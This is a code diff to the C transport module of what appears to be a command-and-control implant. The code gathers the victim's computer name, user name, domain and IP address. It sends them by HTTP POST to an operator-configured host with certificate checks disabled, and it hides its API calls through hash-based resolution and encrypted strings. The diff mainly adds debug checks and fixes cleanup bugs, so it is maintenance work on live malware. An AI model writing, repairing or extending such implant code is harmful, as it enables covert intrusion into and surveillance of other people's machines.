@@ -7,6 +7,7 @@
 #include "Transport.h"
 #include "Utilities.h"
 #include "Obfuscation.h"
+#include "Dbg.h"
 
 #include <iptypes.h>
 #include <iphlpapi.h>
@@ -114,7 +115,7 @@ BOOL TransportInit( ) {
                                                                                             GetComputerNameExA_CRC32B);
     if ( ! p_GetComputerNameExA(ComputerNameNetBIOS, NULL, (LPDWORD) &Length) ) {
         if ( ( Data = LocalAlloc( LPTR, Length ) ) )
-            p_GetComputerNameExA(ComputerNameNetBIOS, Data, (LPDWORD) &Length);
+            check_debug(p_GetComputerNameExA(ComputerNameNetBIOS, Data, (LPDWORD) &Length) != 0, "GetComputerNameExA Failed!");
     }
 
     PackageAddBytes( Package, Data, Length );
@@ -125,7 +126,7 @@ BOOL TransportInit( ) {
 
     Length = MAX_PATH;
     if ( ( Data = LocalAlloc( LPTR, Length ) ) ) {
-        p_GetUserNameA(Data, (LPDWORD) &Length);
+        check_debug(p_GetUserNameA(Data, (LPDWORD) &Length) != 0, "GetUserNameA Failed!");
     }
 
     PackageAddBytes( Package, Data, strlen( Data ) );
@@ -134,14 +135,15 @@ BOOL TransportInit( ) {
     // Get Domain
     if ( ! p_GetComputerNameExA(ComputerNameDnsDomain, NULL, (LPDWORD) &Length) ) {
         if ( ( Data = LocalAlloc( LPTR, Length ) ) )
-            p_GetComputerNameExA(ComputerNameDnsDomain, Data, (LPDWORD) &Length);
+            check_debug(p_GetComputerNameExA(ComputerNameDnsDomain, Data, (LPDWORD) &Length) != 0, "GetComputerNameExA Failed!");
     }
     PackageAddBytes( Package, Data, Length );
     DATA_FREE( Data, Length );
 
     GetAdaptersInfo_t p_GetAdaptersInfo = (GetAdaptersInfo_t) GetProcAddressByHash(p_iphlpapi, GetAdaptersInfo_CRC32B);
 
-    p_GetAdaptersInfo(NULL, (PULONG) &Length);
+    check_debug(p_GetAdaptersInfo(NULL, (PULONG) &Length) != 0, "GetAdaptersInfo Failed!");
+
     if ( ( Adapter = LocalAlloc( LPTR, Length ) ) ) {
         if (p_GetAdaptersInfo(Adapter, (PULONG) &Length) == NO_ERROR ){
             PackageAddBytes( Package, Adapter->IpAddressList.IpAddress.String, strlen( Adapter->IpAddressList.IpAddress.String ) );
@@ -267,12 +269,15 @@ BOOL TransportInit( ) {
             Success = FALSE;
         }
     }
-
+    LEAVE:
+    if(Data != NULL){
+        DATA_FREE(Data, Length)
+    }
 #if CONFIG_OBFUSCATION == TRUE
     // zero out decrypted strings
-    mem_set(d_kernel32,0x0,strlen(d_kernel32));
-    mem_set(d_advapi32,0x0,strlen(d_advapi32));
-    mem_set(d_iphlpapi,0x0,strlen(d_iphlpapi));
+    mem_set(d_kernel32,0x0,strlen(s_kernel32));
+    mem_set(d_advapi32,0x0,strlen(s_advapi32));
+    mem_set(d_iphlpapi,0x0,strlen(s_iphlpapi));
 #endif
     return Success;
 }
@@ -290,44 +295,36 @@ BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize 
     UCHAR   Buffer[ 1024 ]  = { 0 };
     PVOID   RespBuffer      = NULL;
     SIZE_T  RespSize        = 0;
-    BOOL    Successful      = TRUE;
+    BOOL    Successful      = FALSE;
 
 #if CONFIG_OBFUSCATION == TRUE
     unsigned char s_xk[] = S_XK;
     unsigned char s_string[] = S_WINHTTP;
-    unsigned char winhttp[sizeof(s_string)] = {0};
+    unsigned char winhttp[sizeof(s_string)] = { 0 };
 
     ROL_AND_DECRYPT((char *)s_string, sizeof(s_string), 1, winhttp, s_xk);
 
+
     //winhttp[11] = 0x00;
 
-    WinHttpOpen_t pWinHttpOpen  = (WinHttpOpen_t) GetProcAddressByHash(LocalGetModuleHandle(winhttp), WinHttpOpen_CRC32B);
-    hSession = pWinHttpOpen( Instance.Config.Transport.UserAgent, HttpAccessType, HttpProxy, WINHTTP_NO_PROXY_BYPASS, 0 );
+    WinHttpOpen_t p_WinHttpOpen  = (WinHttpOpen_t) GetProcAddressByHash(LocalGetModuleHandle(winhttp), WinHttpOpen_CRC32B);
+    hSession = p_WinHttpOpen( Instance.Config.Transport.UserAgent, HttpAccessType, HttpProxy, WINHTTP_NO_PROXY_BYPASS, 0 );
 
 #else
     hSession = WinHttpOpen( Instance.Config.Transport.UserAgent, HttpAccessType, HttpProxy, WINHTTP_NO_PROXY_BYPASS, 0 );
 #endif
-    if ( ! hSession )
-    {
-        // _tprintf( "WinHttpOpen: Failed => %d\n", GetLastError() );
-        Successful = FALSE;
-        goto LEAVE;
-    }
+    check_debug(hSession != NULL, "WinHttpOpen Failed!");
+
 #if CONFIG_OBFUSCATION == TRUE
-    WinHttpConnect_t pWinHttpConnect  = (WinHttpConnect_t) GetProcAddressByHash(LocalGetModuleHandle(winhttp),
+    WinHttpConnect_t p_WinHttpConnect  = (WinHttpConnect_t) GetProcAddressByHash(LocalGetModuleHandle(winhttp),
                                                                                 WinHttpConnect_CRC32B);
-    hConnect = pWinHttpConnect( hSession, Instance.Config.Transport.Host, Instance.Config.Transport.Port, 0 );
-    WinHttpCloseHandle_t pWinHttpCloseHandle;
+    hConnect = p_WinHttpConnect( hSession, Instance.Config.Transport.Host, Instance.Config.Transport.Port, 0 );
+    WinHttpCloseHandle_t p_WinHttpCloseHandle = NULL;
 #else
     hConnect = WinHttpConnect( hSession, Instance.Config.Transport.Host, Instance.Config.Transport.Port, 0 );
 #endif
 
-    if ( ! hConnect )
-    {
-        // _tprintf( "WinHttpConnect: Failed => %d\n", GetLastError() );
-        Successful = FALSE;
-        goto LEAVE;
-    }
+    check_debug(hConnect != NULL, "WinHttpConnect Failed!");
 
     HttpEndpoint = L"index.php";
     HttpFlags    = WINHTTP_FLAG_BYPASS_PROXY_CACHE;
@@ -337,19 +334,16 @@ BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize 
     }
 
 #if CONFIG_OBFUSCATION == TRUE
-    WinHttpOpenRequest_t pWinHttpOpenRequest  = (WinHttpOpenRequest_t) GetProcAddressByHash(LocalGetModuleHandle(winhttp),
+    WinHttpOpenRequest_t p_WinHttpOpenRequest  = (WinHttpOpenRequest_t) GetProcAddressByHash(LocalGetModuleHandle(winhttp),
                                                                                             WinHttpOpenRequest_CRC32B);
-    hRequest = pWinHttpOpenRequest( hConnect, L"POST", HttpEndpoint, NULL, NULL, NULL, HttpFlags );
+    hRequest = p_WinHttpOpenRequest( hConnect, L"POST", HttpEndpoint, NULL, NULL, NULL, HttpFlags );
+
 
 #else
     hRequest = WinHttpOpenRequest( hConnect, L"POST", HttpEndpoint, NULL, NULL, NULL, HttpFlags );
 #endif
 
-    if ( ! hRequest )
-    {
-        // _tprintf( "WinHttpOpenRequest: Failed => %d\n", GetLastError() );
-        return FALSE;
-    }
+    check_debug(hRequest != NULL, "WinHttpOpenRequest Failed!");
 
     if ( Instance.Config.Transport.Secure )
     {
@@ -358,11 +352,8 @@ BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize 
                     SECURITY_FLAG_IGNORE_CERT_CN_INVALID   |
                     SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
 
-        if ( ! WinHttpSetOption( hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &HttpFlags, sizeof( DWORD ) ) )
-        {
-            __asm("nop");
-            // _tprintf( "WinHttpSetOption: Failed => %d\n", GetLastError() );
-        }
+        check_debug(WinHttpSetOption( hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &HttpFlags, sizeof( DWORD ) ) == TRUE, "WinHttpSetOption Failed!");
+
     }
 
 
@@ -393,9 +384,9 @@ BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize 
             do
             {
 #if CONFIG_OBFUSCATION == TRUE
-                WinHttpReadData_t pWinHttpReadData  = (WinHttpReadData_t) GetProcAddressByHash(LocalGetModuleHandle(winhttp),
+                WinHttpReadData_t p_WinHttpReadData  = (WinHttpReadData_t) GetProcAddressByHash(LocalGetModuleHandle(winhttp),
                                                                                                WinHttpReadData_CRC32B);
-                Successful = pWinHttpReadData( hRequest, Buffer, 1024, &BufRead );
+                Successful = p_WinHttpReadData( hRequest, Buffer, 1024, &BufRead );
 
 #else
                 Successful = WinHttpReadData( hRequest, Buffer, 1024, &BufRead );
@@ -403,10 +394,7 @@ BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize 
 
                 if ( ! Successful || BufRead == 0 )
                 {
-                    if ( ! Successful ) {
-                        __asm("nop");
-                        // _tprintf( "WinHttpReadData: Failed (%d)\n", GetLastError() );
-                    }
+                    check_debug(Successful, "WinHttpReadData Failed!");
                     break;
                 }
 
@@ -449,12 +437,12 @@ BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize 
 
 #if CONFIG_OBFUSCATION == TRUE
 
-    pWinHttpCloseHandle = (WinHttpCloseHandle_t) GetProcAddressByHash(LocalGetModuleHandle(winhttp),
+    p_WinHttpCloseHandle = (WinHttpCloseHandle_t) GetProcAddressByHash(LocalGetModuleHandle(winhttp),
                                                                       WinHttpCloseHandle_CRC32B);
-
-    pWinHttpCloseHandle ( hSession );
-    pWinHttpCloseHandle ( hConnect );
-    pWinHttpCloseHandle ( hRequest );
+    mem_set(winhttp,0x0,strlen(s_string));
+    p_WinHttpCloseHandle ( hSession );
+    p_WinHttpCloseHandle ( hConnect );
+    p_WinHttpCloseHandle ( hRequest );
 
 #else
     WinHttpCloseHandle( hSession );
